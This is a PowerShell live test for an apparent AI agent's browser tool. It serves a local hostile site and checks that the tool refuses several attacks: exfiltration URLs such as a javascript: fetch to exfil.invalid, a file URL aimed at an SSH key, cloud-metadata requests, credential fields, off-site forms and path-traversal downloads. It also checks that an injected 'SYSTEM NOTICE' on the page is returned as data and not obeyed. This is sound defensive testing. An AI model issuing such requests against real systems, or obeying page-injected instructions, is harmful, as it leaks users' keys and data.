#requires -Version 7.0

<#
.SYNOPSIS
    Proves the browser boundary against a page that actively attacks it.
.DESCRIPTION
    The unit suite proves the policy against a corpus of URLs and the Tool
    against a stand-in supervisor. This proves both against a real browser
    rendering a real hostile page: redirects that only resolve after the
    pre-flight check passed, nested frames, pop-ups, downloads, WebSockets,
    beacons, credential boxes wearing innocuous names, a form that posts
    off-site, a file input the page wants pointed at an SSH key, and a download
    whose filename walks out of its folder.

    It needs the Playwright runtime, which only exists after the user has
    consented to it, so it is a live test rather than a unit test:

        pwsh -File tests/live/Invoke-DpBrowserHostileTest.ps1

    The site is served over HTTPS on `hostile.test`, a name the browser is told
    to resolve to loopback, with a certificate generated here. The policy
    correctly refuses plain http, IP literals and single-label hosts, so
    relaxing any of those to make the test convenient would prove a policy
    nobody ships. The two environment hooks that make it possible are asserted
    unreachable from production code by a unit test.
.PARAMETER RuntimeRoot
    Where the browser runtime is installed. Defaults to the DeskPilot data
    directory.
.PARAMETER KeepOpen
    Leave the browser open at the end, for looking at it.
.OUTPUTS
    System.Collections.Hashtable
#>
[CmdletBinding()]
[OutputType([hashtable])]
param(
    [string]$RuntimeRoot,

    [switch]$KeepOpen
)

$ErrorActionPreference = 'Stop'

$repoRoot = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
Get-ChildItem -Path (Join-Path $repoRoot 'source' 'Private') -Filter '*.ps1' | ForEach-Object { . $_.FullName }

if ([string]::IsNullOrWhiteSpace($RuntimeRoot)) { $RuntimeRoot = Join-Path (Get-DpDataDir) 'browser' }

$runtime = Get-DpBrowserRuntime -RuntimeRoot $RuntimeRoot
if (-not $runtime.ready) {
    Write-Host 'Browser automation is not set up on this machine, so the hostile-site proof cannot run.' -ForegroundColor Yellow
    foreach ($issue in $runtime.issues) { Write-Host "  - $issue" -ForegroundColor Yellow }
    Write-Host "  $($runtime.action)" -ForegroundColor Yellow
    return @{ ran = $false; reason = 'runtime-not-ready'; issues = @($runtime.issues) }
}

$results = [System.Collections.Generic.List[object]]::new()
$record = {
    param([string]$Name, [bool]$Passed, [string]$Detail)
    $results.Add(@{ name = $Name; passed = $Passed; detail = $Detail })
    $mark = if ($Passed) { '[+]' } else { '[-]' }
    $colour = if ($Passed) { 'Green' } else { 'Red' }
    Write-Host "$mark $Name" -ForegroundColor $colour
    if ($Detail) { Write-Host "    $Detail" -ForegroundColor DarkGray }
}

$node = Get-DpNodeCommand
$site = $null
$session = $null
$workRoot = Join-Path ([System.IO.Path]::GetTempPath()) ('dp-hostile-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $workRoot -Force | Out-Null

try {
    # A self-signed certificate for the name the browser will be told to resolve
    # to loopback. Generated per run and thrown away with the folder.
    $siteHost = 'hostile.test'
    $rsa = [System.Security.Cryptography.RSA]::Create(2048)
    try {
        $request = [System.Security.Cryptography.X509Certificates.CertificateRequest]::new(
            "CN=$siteHost", $rsa,
            [System.Security.Cryptography.HashAlgorithmName]::SHA256,
            [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
        $sanBuilder = [System.Security.Cryptography.X509Certificates.SubjectAlternativeNameBuilder]::new()
        $sanBuilder.AddDnsName($siteHost)
        $request.CertificateExtensions.Add($sanBuilder.Build())
        $cert = $request.CreateSelfSigned([datetimeoffset]::UtcNow.AddDays(-1), [datetimeoffset]::UtcNow.AddDays(2))

        $certPath = Join-Path $workRoot 'cert.pem'
        $keyPath = Join-Path $workRoot 'key.pem'
        Set-Content -LiteralPath $certPath -Value ($cert.ExportCertificatePem()) -Encoding ascii
        Set-Content -LiteralPath $keyPath -Value ($rsa.ExportPkcs8PrivateKeyPem()) -Encoding ascii
    }
    finally { $rsa.Dispose() }

    # Start the hostile site and learn the port it chose.
    $sitePath = Join-Path $PSScriptRoot 'hostile-site.mjs'
    $psi = [System.Diagnostics.ProcessStartInfo]::new()
    $psi.FileName = $node.path
    foreach ($argument in @($sitePath, '0', $certPath, $keyPath)) { $psi.ArgumentList.Add($argument) }
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.CreateNoWindow = $true
    $site = [System.Diagnostics.Process]::new()
    $site.StartInfo = $psi
    $null = $site.Start()

    $announce = $site.StandardOutput.ReadLineAsync()
    if (-not $announce.Wait(15000)) { throw 'The hostile site did not start.' }
    $port = ($announce.Result | ConvertFrom-Json).port
    $origin = "https://${siteHost}:$port"
    Write-Host "Hostile site on $origin" -ForegroundColor Cyan

    # The two test hooks: resolve the name to loopback, and trust the throwaway
    # certificate. Neither is reachable from production code.
    $env:DESKPILOT_BROWSER_TEST_ARGS = "--host-resolver-rules=MAP $siteHost 127.0.0.1,MAP evil.test 127.0.0.1"
    $env:DESKPILOT_BROWSER_TEST_INSECURE = '1'

    $downloadRoot = Join-Path $workRoot 'downloads'
    $session = Start-DpBrowserSession -Scope @($siteHost) -RuntimeRoot $RuntimeRoot `
        -AllowDownload $true -DownloadRoot $downloadRoot

    # --- Reaching the site at all, which everything below depends on ----------
    $landing = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = "$origin/" } -TimeoutSeconds 60
    & $record 'the in-scope hostile site opens' $landing.ok ([string]$landing.error)
    if (-not $landing.ok) { throw "Could not open the hostile site: $($landing.error)" }
    & $record 'its injected instruction comes back as data, not as an action' `
    ([string]$landing.result.text -match 'SYSTEM NOTICE') 'the tool returned the text; nothing acted on it'

    # --- Navigation policy, from a real page ---------------------------------
    foreach ($case in @(
            @{ Name = 'a redirect that lands off-site is refused'; Path = '/redirect-offsite' }
            @{ Name = 'an off-scope address the page asked for is refused'; Url = 'https://exfil.invalid/?ctx=D%3A%5CGit' }
            @{ Name = 'a local file url is refused'; Url = 'file:///C:/Users/install/.ssh/id_rsa' }
            @{ Name = 'a javascript url is refused'; Url = 'javascript:fetch("https://exfil.invalid")' }
            @{ Name = 'the cloud metadata service is refused'; Url = 'https://169.254.169.254/latest/meta-data/' }
            @{ Name = "DeskPilot's own loopback API is refused"; Url = 'https://127.0.0.1:8720/api/settings' }
            @{ Name = 'a credential in the address is refused'; Url = 'https://user:secret@exfil.invalid/' }
        )) {
        $url = if ($case.ContainsKey('Url')) { $case.Url } else { "$origin$($case.Path)" }
        $response = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = $url } -TimeoutSeconds 45
        $blockedByPolicy = -not $response.ok -and [string]$response.error -notmatch 'ERR_NAME_NOT_RESOLVED'
        & $record $case.Name $blockedByPolicy ([string]$response.error)
    }

    # --- Page-driven channels ------------------------------------------------
    $null = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = "$origin/osorno" } -TimeoutSeconds 45
    Start-Sleep -Milliseconds 800
    $status = Invoke-DpBrowserRequest -Session $session -Command 'status' -TimeoutSeconds 15
    $reachedExfil = @($status.result.blocked | Where-Object { $_.url -match 'exfil\.invalid' })
    & $record 'the page''s own script, socket and beacon were refused' `
    ($reachedExfil.Count -gt 0) "blocked: $((@($reachedExfil | ForEach-Object { $_.resourceType }) | Select-Object -Unique) -join ', ')"

    $null = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = "$origin/popup" } -TimeoutSeconds 45
    Start-Sleep -Milliseconds 800
    $status = Invoke-DpBrowserRequest -Session $session -Command 'status' -TimeoutSeconds 15
    & $record 'a pop-up was closed rather than followed' `
    (@($status.result.blocked | Where-Object { $_.reason -eq 'popup' }).Count -gt 0) ''

    $null = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = "$origin/frame-page" } -TimeoutSeconds 45
    Start-Sleep -Milliseconds 800
    $status = Invoke-DpBrowserRequest -Session $session -Command 'status' -TimeoutSeconds 15
    & $record 'a nested frame could not leave the scope' `
    (@($status.result.blocked | Where-Object { $_.url -match 'exfil\.invalid' }).Count -gt 0) ''

    # --- The write surface ---------------------------------------------------
    $null = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = "$origin/credentials" } -TimeoutSeconds 45

    $ordinary = Invoke-DpBrowserRequest -Session $session -Command 'fill' -TimeoutSeconds 45 -Payload @{
        fields = @(@{ name = 'window'; value = 'Monday 02:00' })
    }
    & $record 'an ordinary field is filled' $ordinary.ok ([string]$ordinary.error)

    foreach ($case in @(
            @{ Name = 'a password box is refused, whatever it is called'; Field = 'reference' }
            @{ Name = 'a one-time-code field is refused'; Field = 'confirmation' }
            @{ Name = 'a field the site declares as a password is refused'; Field = 'site_key' }
            @{ Name = 'a hidden field is refused'; Field = 'csrf' }
            @{ Name = 'an invisible field is refused'; Field = 'ghost' }
            @{ Name = 'a read-only field is refused'; Field = 'locked' }
        )) {
        $response = Invoke-DpBrowserRequest -Session $session -Command 'fill' -TimeoutSeconds 45 -Payload @{
            fields = @(@{ name = $case.Field; value = 'should-never-be-typed' })
        }
        & $record $case.Name (-not $response.ok) ([string]$response.error)
    }

    $null = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = "$origin/offsite-form" } -TimeoutSeconds 45
    $offsite = Invoke-DpBrowserRequest -Session $session -Command 'fill' -TimeoutSeconds 45 -Payload @{
        fields     = @(@{ name = 'detail'; value = 'x' })
        submitWith = 'Save'
    }
    # The scope check has to be what refuses it, not an incidental page error.
    $stoppedByScope = -not $offsite.ok -and [string]$offsite.error -match 'not in scope'
    & $record 'a form that posts off-site is stopped at the press' $stoppedByScope ([string]$offsite.error)

    $null = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = "$origin/upload" } -TimeoutSeconds 45
    $wrongField = Invoke-DpBrowserRequest -Session $session -Command 'upload' -TimeoutSeconds 45 -Payload @{
        fieldName = 'notes2'; path = (Join-Path $workRoot 'cert.pem')
    }
    & $record 'a file cannot be attached to a field that is not a file input' (-not $wrongField.ok) ([string]$wrongField.error)

    # --- Downloads -----------------------------------------------------------
    $null = Invoke-DpBrowserRequest -Session $session -Command 'navigate' -Payload @{ url = "$origin/traversal-download" } -TimeoutSeconds 45
    $download = Invoke-DpBrowserRequest -Session $session -Command 'download' -Payload @{ controlText = 'Export' } -TimeoutSeconds 60
    $savedAs = [string]$download.result.savedAs
    $stayedPut = $download.ok -and $savedAs -and
        ([System.IO.Path]::GetFullPath($savedAs)).StartsWith(([System.IO.Path]::GetFullPath($downloadRoot)), [System.StringComparison]::OrdinalIgnoreCase)
    & $record 'a download filename cannot walk out of its folder' $stayedPut "saved as: $savedAs"

    # --- Stop ----------------------------------------------------------------
    if (-not $KeepOpen) {
        $processId = $session.process.Id
        Stop-DpBrowserSession -Session $session -Confirm:$false
        $session = $null
        $survivors = @(Get-Process -Id $processId -ErrorAction SilentlyContinue)
        & $record 'stop ends the supervisor process' ($survivors.Count -eq 0) ''

        # Promptly, not instantaneously: Chromium takes a moment to release
        # after Playwright closes it, so this waits rather than sampling once.
        $deadline = [datetime]::UtcNow.AddSeconds(20)
        $orphans = @(Get-DpBrowserOrphan -RuntimeRoot $RuntimeRoot)
        while ($orphans.Count -gt 0 -and [datetime]::UtcNow -lt $deadline) {
            Start-Sleep -Milliseconds 500
            $orphans = @(Get-DpBrowserOrphan -RuntimeRoot $RuntimeRoot)
        }
        & $record 'no browser process is left behind' ($orphans.Count -eq 0) "orphans: $($orphans.Count)"
    }
}
finally {
    Remove-Item Env:DESKPILOT_BROWSER_TEST_ARGS -ErrorAction SilentlyContinue
    Remove-Item Env:DESKPILOT_BROWSER_TEST_INSECURE -ErrorAction SilentlyContinue
    if ($session) { Stop-DpBrowserSession -Session $session -Confirm:$false }
    if ($site -and -not $site.HasExited) {
        try { $site.Kill($true) } catch { $null = $_ }
    }
    if ($site) { $site.Dispose() }
    if (-not $KeepOpen -and (Test-Path -LiteralPath $workRoot)) {
        Remove-Item -LiteralPath $workRoot -Recurse -Force -ErrorAction SilentlyContinue
    }
}

$failed = @($results | Where-Object { -not $_.passed })
Write-Host ''
Write-Host "Hostile-site proof: $($results.Count - $failed.Count)/$($results.Count) passed." -ForegroundColor $(if ($failed.Count) { 'Red' } else { 'Green' })

@{ ran = $true; total = $results.Count; failed = $failed.Count; results = @($results) }
